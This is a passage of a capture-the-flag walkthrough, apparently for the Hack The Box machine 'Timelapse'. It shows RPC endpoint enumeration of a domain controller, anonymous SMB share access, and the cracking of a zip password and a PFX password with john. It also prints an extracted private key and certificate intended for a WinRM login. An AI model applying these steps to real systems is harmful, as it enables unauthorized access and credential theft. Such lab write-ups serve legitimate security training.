          ncalrpc:[LRPC-2ea92b8f1169a6db06]                                      
          ncalrpc:[OLE9400262AB2E084771EAFC37900CD]                                                                                                               

Protocol: N/A                           
Provider: N/A                           
UUID    : 7AEB6705-3AE6-471A-882D-F39C109EDC12 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-2ea92b8f1169a6db06]                                      
          ncalrpc:[OLE9400262AB2E084771EAFC37900CD]                                                                                                               

Protocol: N/A                           
Provider: N/A                           
UUID    : E7F76134-9EF5-4949-A2D6-3368CC0988F3 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-2ea92b8f1169a6db06]                                      
          ncalrpc:[OLE9400262AB2E084771EAFC37900CD]                                                                                                               

Protocol: N/A                           
Provider: N/A                           
UUID    : B37F900A-EAE4-4304-A2AB-12BB668C0188 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-2ea92b8f1169a6db06]                                      
          ncalrpc:[OLE9400262AB2E084771EAFC37900CD]                                                                                                               

Protocol: N/A                           
Provider: N/A                           
UUID    : ABFB6CA3-0C5E-4734-9285-0AEE72FE8D1C v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-2ea92b8f1169a6db06]                                      
          ncalrpc:[OLE9400262AB2E084771EAFC37900CD]                                                                                                               

Protocol: N/A                           
Provider: N/A                           
UUID    : C49A5A70-8A7F-4E70-BA16-1E8F1F193EF1 v1.0 Adh APIs                                                                                                      
Bindings:                               
          ncalrpc:[OLED9B8555631549CD714B9C84E3519]                                                                                                               
          ncalrpc:[TeredoControl]                                                
          ncalrpc:[TeredoDiagnostics]                                            
          ncalrpc:[LRPC-fba355781d3fbb91d4]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : C36BE077-E14B-4FE9-8ABC-E856EF4F048B v1.0 Proxy Manager client server endpoint                                                                          
Bindings:                               
          ncalrpc:[TeredoControl]                                                
          ncalrpc:[TeredoDiagnostics]                                            
          ncalrpc:[LRPC-fba355781d3fbb91d4]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 2E6035B2-E8F1-41A7-A044-656B439C4C34 v1.0 Proxy Manager provider server endpoint                                                                        
Bindings:                               
          ncalrpc:[TeredoControl]                                                
          ncalrpc:[TeredoDiagnostics]                                            
          ncalrpc:[LRPC-fba355781d3fbb91d4]                                      

Protocol: N/A                           
Provider: iphlpsvc.dll                  
UUID    : 552D076A-CB29-4E44-8B6A-D15E59E2C0AF v1.0 IP Transition Configuration endpoint                                                                          
Bindings:                               
          ncalrpc:[LRPC-fba355781d3fbb91d4]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 0D3C7F20-1C8D-4654-A1B3-51563B298BDA v1.0 UserMgrCli                                                                                                    
Bindings:                               
          ncalrpc:[LRPC-17fa6ba4077d1404a7]                                      
          ncalrpc:[OLEBA3BEE66052CFB5E0BDC0B08483A]                                                                                                               

Protocol: N/A                           
Provider: N/A                           
UUID    : B18FBAB6-56F8-4702-84E0-41053293A869 v1.0 UserMgrCli                                                                                                    
Bindings:                               
          ncalrpc:[LRPC-17fa6ba4077d1404a7]                                      
          ncalrpc:[OLEBA3BEE66052CFB5E0BDC0B08483A]                                                                                                               

Protocol: N/A                           
Provider: N/A                           
UUID    : 51A227AE-825B-41F2-B4A9-1AC9557A1018 v1.0 Ngc Pop Key Service                                                                                           
Bindings:                               
          ncalrpc:[NETLOGON_LRPC]                                                
          ncacn_ip_tcp:10.10.11.152[49674]                                       
          ncacn_np:\\DC01[\pipe\c56d5d9113bc0d6d]                                
          ncacn_http:10.10.11.152[49673]                                         
          ncalrpc:[NTDS_LPC]                                                     
          ncalrpc:[OLEBBBB03AC5042F27FBF773FABD201]                                                                                                               
          ncacn_ip_tcp:10.10.11.152[49667]                                       
          ncalrpc:[samss lpc]                                                    
          ncalrpc:[SidKey Local End Point]                                       
          ncalrpc:[protected_storage]                                            
          ncalrpc:[lsasspirpc]                                                   
          ncalrpc:[lsapolicylookup]                                              
          ncalrpc:[LSA_EAS_ENDPOINT]                                             
          ncalrpc:[lsacap]                                                       
          ncalrpc:[LSARPC_ENDPOINT]                                              
          ncalrpc:[securityevent]                                                
          ncalrpc:[audit]                                                        
          ncacn_np:\\DC01[\pipe\lsass]         

Protocol: N/A                                                                                                                                                     
Provider: N/A                                                                                                                                                     
UUID    : 8FB74744-B2FF-4C00-BE0D-9EF9A191FE1B v1.0 Ngc Pop Key Service                                                                                           
Bindings:                               
          ncalrpc:[NETLOGON_LRPC]                                                
          ncacn_ip_tcp:10.10.11.152[49674]                                       
          ncacn_np:\\DC01[\pipe\c56d5d9113bc0d6d]                                
          ncacn_http:10.10.11.152[49673]                                         
          ncalrpc:[NTDS_LPC]                                                     
          ncalrpc:[OLEBBBB03AC5042F27FBF773FABD201]                                                                                                               
          ncacn_ip_tcp:10.10.11.152[49667]                                       
          ncalrpc:[samss lpc]                                                    
          ncalrpc:[SidKey Local End Point]                                       
          ncalrpc:[protected_storage]                                            
          ncalrpc:[lsasspirpc]                                                   
          ncalrpc:[lsapolicylookup]                                              
          ncalrpc:[LSA_EAS_ENDPOINT]                                             
          ncalrpc:[lsacap]                                                       
          ncalrpc:[LSARPC_ENDPOINT]                                              
          ncalrpc:[securityevent]                                                
          ncalrpc:[audit]                                                        
          ncacn_np:\\DC01[\pipe\lsass]                                           

Protocol: N/A                           
Provider: N/A                           
UUID    : B25A52BF-E5DD-4F4A-AEA6-8CA7272A0E86 v2.0 KeyIso                                                                                                        
Bindings:                               
          ncalrpc:[NETLOGON_LRPC]                                                
          ncacn_ip_tcp:10.10.11.152[49674]                                       
          ncacn_np:\\DC01[\pipe\c56d5d9113bc0d6d]                                
          ncacn_http:10.10.11.152[49673]                                         
          ncalrpc:[NTDS_LPC]                                                     
          ncalrpc:[OLEBBBB03AC5042F27FBF773FABD201]                                                                                                               
          ncacn_ip_tcp:10.10.11.152[49667]                                       
          ncalrpc:[samss lpc]                                                    
          ncalrpc:[SidKey Local End Point]                                       
          ncalrpc:[protected_storage]                                            
          ncalrpc:[lsasspirpc]                                                   
          ncalrpc:[lsapolicylookup]                                              
          ncalrpc:[LSA_EAS_ENDPOINT]                                             
          ncalrpc:[lsacap]                                                       
          ncalrpc:[LSARPC_ENDPOINT]                                              
          ncalrpc:[securityevent]                                                
          ncalrpc:[audit]                                                        
          ncacn_np:\\DC01[\pipe\lsass]                                           

Protocol: [MS-NRPC]: Netlogon Remote Protocol                                    
Provider: netlogon.dll                  
UUID    : 12345678-1234-ABCD-EF00-01234567CFFB v1.0                                                                                                               
Bindings:                               
          ncalrpc:[NETLOGON_LRPC]                                                
          ncacn_ip_tcp:10.10.11.152[49674]                                       
          ncacn_np:\\DC01[\pipe\c56d5d9113bc0d6d]                                
          ncacn_http:10.10.11.152[49673]                                         
          ncalrpc:[NTDS_LPC]                                                     
          ncalrpc:[OLEBBBB03AC5042F27FBF773FABD201]                                                                                                               
          ncacn_ip_tcp:10.10.11.152[49667]                                       
          ncalrpc:[samss lpc]                                                    
          ncalrpc:[SidKey Local End Point]                                       
          ncalrpc:[protected_storage]                                            
          ncalrpc:[lsasspirpc]                                                   
          ncalrpc:[lsapolicylookup]                                              
          ncalrpc:[LSA_EAS_ENDPOINT]                                             
          ncalrpc:[lsacap]                                                       
          ncalrpc:[LSARPC_ENDPOINT]                                              
          ncalrpc:[securityevent]                                                
          ncalrpc:[audit]                                                        
          ncacn_np:\\DC01[\pipe\lsass]                                           

Protocol: [MS-RAA]: Remote Authorization API Protocol                                                                                                             
Provider: N/A                           
UUID    : 0B1C2170-5732-4E0E-8CD3-D9B16F3B84D7 v0.0 RemoteAccessCheck                                                                                             
Bindings:                               
          ncalrpc:[NETLOGON_LRPC]                                                
          ncacn_ip_tcp:10.10.11.152[49674]                                       
          ncacn_np:\\DC01[\pipe\c56d5d9113bc0d6d]                                
          ncacn_http:10.10.11.152[49673]                                         
          ncalrpc:[NTDS_LPC]                                                     
          ncalrpc:[OLEBBBB03AC5042F27FBF773FABD201]                                                                                                               
          ncacn_ip_tcp:10.10.11.152[49667]                                       
          ncalrpc:[samss lpc]                                                    
          ncalrpc:[SidKey Local End Point]                                       
          ncalrpc:[protected_storage]                                            
          ncalrpc:[lsasspirpc]                                                   
          ncalrpc:[lsapolicylookup]                                              
          ncalrpc:[LSA_EAS_ENDPOINT]                                             
          ncalrpc:[lsacap]                                                       
          ncalrpc:[LSARPC_ENDPOINT]                                              
          ncalrpc:[securityevent]                                                
          ncalrpc:[audit]                                                        
          ncacn_np:\\DC01[\pipe\lsass]                                           
          ncalrpc:[NETLOGON_LRPC]                                                
          ncacn_ip_tcp:10.10.11.152[49674]                                       
          ncacn_np:\\DC01[\pipe\c56d5d9113bc0d6d]                                
          ncacn_http:10.10.11.152[49673]                                         
          ncalrpc:[NTDS_LPC]                                                     
          ncalrpc:[OLEBBBB03AC5042F27FBF773FABD201]                                                                                                               
          ncacn_ip_tcp:10.10.11.152[49667]                                       
          ncalrpc:[samss lpc]                                                    
          ncalrpc:[SidKey Local End Point]                                       
          ncalrpc:[protected_storage]                                            
          ncalrpc:[lsasspirpc]                                                   
          ncalrpc:[lsapolicylookup]                                              
          ncalrpc:[LSA_EAS_ENDPOINT]                                             
          ncalrpc:[lsacap]                                                       
          ncalrpc:[LSARPC_ENDPOINT]                                              
          ncalrpc:[securityevent]                                                
          ncalrpc:[audit]                                                        
          ncacn_np:\\DC01[\pipe\lsass]    
          
Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol                                                                                               
Provider: samsrv.dll                                                                                                                                              
UUID    : 12345778-1234-ABCD-EF00-0123456789AC v1.0                                                                                                               
Bindings:                               
          ncacn_ip_tcp:10.10.11.152[49674]                                       
          ncacn_np:\\DC01[\pipe\c56d5d9113bc0d6d]                                
          ncacn_http:10.10.11.152[49673]                                         
          ncalrpc:[NTDS_LPC]                                                     
          ncalrpc:[OLEBBBB03AC5042F27FBF773FABD201]                                                                                                               
          ncacn_ip_tcp:10.10.11.152[49667]                                       
          ncalrpc:[samss lpc]                                                    
          ncalrpc:[SidKey Local End Point]                                       
          ncalrpc:[protected_storage]                                            
          ncalrpc:[lsasspirpc]                                                   
          ncalrpc:[lsapolicylookup]                                              
          ncalrpc:[LSA_EAS_ENDPOINT]                                             
          ncalrpc:[lsacap]                                                       
          ncalrpc:[LSARPC_ENDPOINT]                                              
          ncalrpc:[securityevent]                                                
          ncalrpc:[audit]                                                        
          ncacn_np:\\DC01[\pipe\lsass]                                           

Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote                                                                                        
Provider: lsasrv.dll                    
UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0                                                                                                               
Bindings:                               
          ncacn_np:\\DC01[\pipe\c56d5d9113bc0d6d]                                
          ncacn_http:10.10.11.152[49673]                                         
          ncalrpc:[NTDS_LPC]                                                     
          ncalrpc:[OLEBBBB03AC5042F27FBF773FABD201]                                                                                                               
          ncacn_ip_tcp:10.10.11.152[49667]                                       
          ncalrpc:[samss lpc]                                                    
          ncalrpc:[SidKey Local End Point]                                       
          ncalrpc:[protected_storage]                                            
          ncalrpc:[lsasspirpc]                                                   
          ncalrpc:[lsapolicylookup]                                              
          ncalrpc:[LSA_EAS_ENDPOINT]                                             
          ncalrpc:[lsacap]                                                       
          ncalrpc:[LSARPC_ENDPOINT]                                              
          ncalrpc:[securityevent]                                                
          ncalrpc:[audit]                                                        
          ncacn_np:\\DC01[\pipe\lsass]                                           

Protocol: [MS-DRSR]: Directory Replication Service (DRS) Remote Protocol                                                                                          
Provider: ntdsai.dll                    
UUID    : E3514235-4B06-11D1-AB04-00C04FC2DCD2 v4.0 MS NT Directory DRS Interface                                                                                 
Bindings:                               
          ncacn_np:\\DC01[\pipe\c56d5d9113bc0d6d]                                
          ncacn_http:10.10.11.152[49673]                                         
          ncalrpc:[NTDS_LPC]                                                     
          ncalrpc:[OLEBBBB03AC5042F27FBF773FABD201]                                                                                                               
          ncacn_ip_tcp:10.10.11.152[49667]                                       
          ncalrpc:[samss lpc]                                                    
          ncalrpc:[SidKey Local End Point]                                       
          ncalrpc:[protected_storage]                                            
          ncalrpc:[lsasspirpc]                                                   
          ncalrpc:[lsapolicylookup]                                              
          ncalrpc:[LSA_EAS_ENDPOINT]                                             
          ncalrpc:[lsacap]                                                       
          ncalrpc:[LSARPC_ENDPOINT]                                              
          ncalrpc:[securityevent]                                                
          ncalrpc:[audit]                                                        
          ncacn_np:\\DC01[\pipe\lsass]                                           

Protocol: N/A                           
Provider: N/A                           
UUID    : 1A0D010F-1C33-432C-B0F5-8CF4E8053099 v1.0 IdSegSrv service                                                                                              
Bindings:                               
          ncalrpc:[LRPC-0478941b02c6103bbf]                                      

Protocol: N/A                           
Provider: srvsvc.dll                    
UUID    : 98716D03-89AC-44C7-BB8C-285824E51C4A v1.0 XactSrv service                                                                                               
Bindings:                               
          ncalrpc:[LRPC-0478941b02c6103bbf]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : DF4DF73A-C52D-4E3A-8003-8437FDF8302A v0.0 WM_WindowManagerRPC\Server                                                                                    
Bindings:                               
          ncalrpc:[LRPC-0aa99f662eca570d92]                                      

Protocol: N/A                           
Provider: sysmain.dll                   
UUID    : B58AA02E-2884-4E97-8176-4EE06D794184 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-6fe368225e32744bad]                                      

Protocol: N/A                           
Provider: IKEEXT.DLL                    
UUID    : A398E520-D59A-4BDD-AA7A-3C1E0303A511 v1.0 IKE/Authip API                                                                                                
Bindings:                               
          ncalrpc:[LRPC-e8cc3583a6bd15832b]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 2F5F6521-CB55-1059-B446-00DF0BCE31DB v1.0 Unimodem LRPC Endpoint                                                                                        
Bindings:                               
          ncalrpc:[unimdmsvc]                                                    
          ncalrpc:[tapsrvlpc]                                                    
          ncacn_np:\\DC01[\pipe\tapsrv]                                          

Protocol: N/A                           
Provider: N/A                           
UUID    : 650A7E26-EAB8-5533-CE43-9C1DFCE11511 v1.0 Vpn APIs                                                                                                      
Bindings:                               
          ncalrpc:[LRPC-ba9e31870c3be3993a]                                      
          ncalrpc:[VpnikeRpc]                                                    
          ncalrpc:[RasmanLrpc]                                                   
          ncacn_np:\\DC01[\PIPE\ROUTER]    

Protocol: N/A                                                                                                                                                     
Provider: N/A                           
UUID    : 98CD761E-E77D-41C8-A3C0-0FB756D90EC2 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-1858fbecc1017cfa4b]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : D22895EF-AFF4-42C5-A5B2-B14466D34AB4 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-1858fbecc1017cfa4b]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : E38F5360-8572-473E-B696-1B46873BEEAB v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-1858fbecc1017cfa4b]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 95095EC8-32EA-4EB0-A3E2-041F97B36168 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-1858fbecc1017cfa4b]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : FD8BE72B-A9CD-4B2C-A9CA-4DED242FBE4D v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-1858fbecc1017cfa4b]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 4C9DBF19-D39E-4BB9-90EE-8F7179B20283 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-1858fbecc1017cfa4b]                                      

Protocol: [MS-CMPO]: MSDTC Connection Manager:                                   
Provider: msdtcprx.dll                  
UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-3bfaa338ecbf81102f]                                      
          ncalrpc:[OLE7B56124F8F63B6FD8A33A51CE1B5]                                                                                                               
          ncalrpc:[LRPC-afdc286bf6ff447196]                                      
          ncalrpc:[LRPC-afdc286bf6ff447196]                                      
          ncalrpc:[LRPC-afdc286bf6ff447196]                                      

Protocol: [MS-SCMR]: Service Control Manager Remote Protocol                                                                                                      
Provider: services.exe                  
UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0                                                                                                               
Bindings:                               
          ncacn_ip_tcp:10.10.11.152[49677]                                       

Protocol: N/A                           
Provider: N/A                           
UUID    : F3F09FFD-FBCF-4291-944D-70AD6E0E73BB v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-38cf47336d01e2151b]                                      

Protocol: [MS-DNSP]: Domain Name Service (DNS) Server Management                                                                                                  
Provider: dns.exe                       
UUID    : 50ABC2A4-574D-40B3-9D66-EE4FD5FBA076 v5.0                                                                                                               
Bindings:                               
          ncacn_ip_tcp:10.10.11.152[49693]                                       

Protocol: N/A                           
Provider: N/A                           
UUID    : A4B8D482-80CE-40D6-934D-B22A01A44FE7 v1.0 LicenseManager                                                                                                
Bindings:                               
          ncalrpc:[LicenseServiceEndpoint]                                       

Protocol: [MS-FRS2]: Distributed File System Replication Protocol                                                                                                 
Provider: dfsrmig.exe                   
UUID    : 897E2E5F-93F3-4376-9C9C-FD2277495C27 v1.0 Frs2 Service                                                                                                  
Bindings:                               
          ncacn_ip_tcp:10.10.11.152[49719]                                       
          ncalrpc:[OLE184FC3E672550ECA1EAE62E56AA8]                                                                                                               

Protocol: N/A                           
Provider: N/A                           
UUID    : BF4DC912-E52F-4904-8EBE-9317C1BDD497 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-06dc7806c473dc6978]                                      
          ncalrpc:[OLE5DF6524D1DA738659AF81A6480CB]                                                                                                               

Protocol: N/A                           
Provider: pcasvc.dll                    
UUID    : 0767A036-0D22-48AA-BA69-B619480F38CB v1.0 PcaSvc                                                                                                        
Bindings:                               
          ncalrpc:[LRPC-3d796c336135cf5f59]                                      

[*] Received 418 endpoints.        
```
### smbclient for smb enumeration
- `-L` for listing
- `-N` for anonymous binding
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                                
└─$ smbclient -N -L \\\\10.10.11.152\\Shares                                                      
Password for [WORKGROUP\kali]:                                                                   

        Sharename       Type      Comment                                                        
        ---------       ----      -------                                                        
        ADMIN$          Disk      Remote Admin                                                   
        C$              Disk      Default share                                                  
        IPC$            IPC       Remote IPC                                                     
        NETLOGON        Disk      Logon server share                                             
        Shares          Disk                                                                     
        SYSVOL          Disk      Logon server share                                             
Reconnecting with SMB1 for workgroup listing.                                                    
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available    
```
- `-N` just this for anonymous binding to browse the share
	- mget to pull winrm_backup.zip
	- mget `*` to pull down the whole directory
```bash
┌──(kali㉿kali)-[~/htb/timelapse]               
└─$ smbclient -N \\\\10.10.11.152\\Shares                                                        
                                                                           
Try "help" to get a list of possible commands.                                                   
smb: \> dir                                     
  .                                   D        0  Mon Oct 25 11:39:15 2021                       
  ..                                  D        0  Mon Oct 25 11:39:15 2021                       
  Dev                                 D        0  Mon Oct 25 15:40:06 2021                       
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021                       

                6367231 blocks of size 4096. 1429108 blocks available                            
smb: \> cd Dev                                  
smb: \Dev\> dir                                 
  .                                   D        0  Mon Oct 25 15:40:06 2021                       
  ..                                  D        0  Mon Oct 25 15:40:06 2021                       
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021                       

                6367231 blocks of size 4096. 1428511 blocks available                            
smb: \Dev\> get winrm_backup.zip                
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (13.5 KiloBytes/sec) (average
 13.5 KiloBytes/sec)
```
### Unzipping winrm_backup.zip
- found to need a password
```bash
┌──(kali㉿kali)-[~/htb/timelapse]               
└─$ unzip winrm_backup.zip                                                                       
Archive:  winrm_backup.zip                      
[winrm_backup.zip] legacyy_dev_auth.pfx password:                                                
   skipping: legacyy_dev_auth.pfx    incorrect password   
```
- `zip2john` can pull hashes from zip files
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                                
└─$ zip2john winrm_backup.zip > YourMomsZipHash.txt                                              
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, 
decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8    
┌──(kali㉿kali)-[~/htb/timelapse]                                                                
└─$ cat YourMomsZipHash.txt                                                                      
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec5683*0*4e*8*965*72aa*1a84b40ec6b
5c20abd7d695aa16d8c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d82727976
...clipped ...
23d27140c6830563ee783156404a17e2f7b7e506452f76*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::wi
nrm_backup.zip
```
- john can crack hashes so we pass the file to john
	- cracked hash = supremelegacy
```bash
┌──(kali㉿kali)-[~/htb/timelapse]               
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt YourMomsZipHash.txt                    
Using default input encoding: UTF-8             
Loaded 1 password hash (PKZIP [32/64])          
Will run 16 OpenMP threads                      
Press 'q' or Ctrl-C to abort, almost any other key for status                                    
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)                                         
1g 0:00:00:01 DONE (2025-10-04 10:16) 0.9433g/s 3276Kp/s 3276Kc/s 3276KC/s swimfan12..superkebab
Use the "--show" option to display all of the cracked passwords reliably                         
Session completed.    
```
- using password `supremelegacy` on zip file inflates legacyy_dev_auth.pfx
- pfx files are encrypted
```bash
┌──(kali㉿kali)-[~/htb/timelapse]               
└─$ cat legacyy_dev_auth.pfx                    
00      0       0       0H      *H              
  *H                                            

00                                              
*H                                              
+SkKI<_ ErHL؋rC(!,G-                            
                    pbm)fcg{JǢ_s`|Ic%Cr!UewYpe!1!`S;:,$)8_P,ТWUP_(P+2)?%R       ~6L>;UǼDo@&0Avյuy
```
- and running strings on it reveals nothing useful
	- maybe a email address? legacyy@timelapse.htb
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                                
└─$ strings legacyy_dev_auth.pfx                                                                 
_       Er                                                                                       
C(!,                                                                                             
4bz'                                                                                             
`o<l                                                                                             
|Y4W                                                                                             
I0{Q                                                                                             
L(vqQ#                                                                                           
{q[l"8                                                                                           
`+$DOC                                                                                           
hK*y                                                                                             
;5UERr                                                                                           
X!+3                                                                                             
&JCy                                                                                             
$-1f                                                                                             
NAM'u                                                                                            
"-r$$                                                                                            
Legacyy0                                                                                         
211025140552Z                                                                                    
311025141552Z0                                                                                   
Legacyy0                                                                                         
r"*J0:                                                                                           
cZK3                                            
".G,                                            
x0v0                                            
legacyy@timelapse.htb0                          
}J5~f                                           
t{(lz                                           
5&8H                                            
&4<6                                            
kj@1                                            
uUh2s         
```
- john has a pfx module to extract hashes
	- so we pass it the hash and save it to new file 
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                                
└─$ pfx2john legacyy_dev_auth.pfx > YourMomsPFX.txt
```
- and use john to crack the hash
	- cracked password from hash is `thuglegacy`
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                                
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt YourMomsPFX.txt                             
Using default input encoding: UTF-8                                                              
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 SSE2 4x])             
Cost 1 (iteration count) is 2000 for all loaded hashes                                           
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 16 OpenMP threads                                                                       
Press 'q' or Ctrl-C to abort, almost any other key for status                                    
thuglegacy       (legacyy_dev_auth.pfx)                                                          
1g 0:00:00:33 DONE (2025-10-04 10:48) 0.03019g/s 97576p/s 97576c/s 97576C/s thumper1990..thsco04
Use the "--show" option to display all of the cracked passwords reliably                         
Session completed.     
```
- Using openssl To view contents of the pfx file - 
	- Show a human-readable dump of the PFX's certificates and verify dates (prompts for pfx password)
	- found to have a PRIVATE KEY and a CERTIFICATE
	- both can be used to by Evil-WinRM to login as the user 
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                                
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -info -nodes                                         
          
Enter Import Password:                          
MAC: sha1, Iteration 2000                       
MAC length: 20, salt length: 20                                                                  
PKCS7 Data                                      
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
Bag Attributes                                  
    Microsoft Local Key set: <No Values>                                                         
    localKeyID: 01 00 00 00                                                                      
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes                                  
    X509v3 Key Usage: 90                        
-----BEGIN PRIVATE KEY-----                                                                      
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz
TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3to
pwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsb
oRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3
dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2
qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzD
MEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzW
fAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9j
PJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnL
GNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0
Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmU
Ifvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ
7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7
tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ
2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja
8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV
1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegI
ZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7o
btTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN
71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3
QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b0
6jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK
/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/r
c2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+X
TTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8
A5ZZvI+GsHhm0Oab7PEWlRY=                        
-----END PRIVATE KEY-----                       
PKCS7 Data                                      
Certificate bag                                 
Bag Attributes                                  
    localKeyID: 01 00 00 00                                                                      
subject=CN=Legacyy                              
issuer=CN=Legacyy      
-----BEGIN CERTIFICATE-----                                                                      
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
